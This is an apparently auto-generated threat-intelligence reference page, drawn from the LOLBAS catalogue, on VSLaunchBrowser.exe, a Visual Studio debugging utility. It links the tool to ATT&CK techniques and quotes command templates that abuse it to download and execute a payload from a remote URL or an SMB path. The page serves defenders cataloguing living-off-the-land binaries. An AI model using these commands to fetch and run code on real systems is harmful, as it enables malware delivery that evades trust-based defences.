---
parsed_by: focuslocust
source: lolbas
type: generated
---
# VSLaunchBrowser.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `vslaunchbrowser.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/VsLaunchBrowser.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Visual Studio browser launcher tool for web applications debugging

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/vslaunchbrowser.md)
- Source verification: [source record](../../sources/lolbas/vslaunchbrowser.exe.md)

## Aliases

- `VSLaunchBrowser.exe`
- `vslaunchbrowser.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: VSLaunchBrowser.exe .exe {REMOTEURL:.exe} |
| [T1127 - Trusted Developer Utilities Proxy Execution](../../attack/techniques/T1127-trusted-developer-utilities-proxy-execution.md) | explicit | source | Command metadata lists T1127: VSLaunchBrowser.exe .exe {PATH_SMB} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/vslaunchbrowser.exe.md)

## Source Verification

[source record](../../sources/lolbas/vslaunchbrowser.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@AvihayEldad'
Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
Command: VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
Description: Download and execute payload from remote server
```
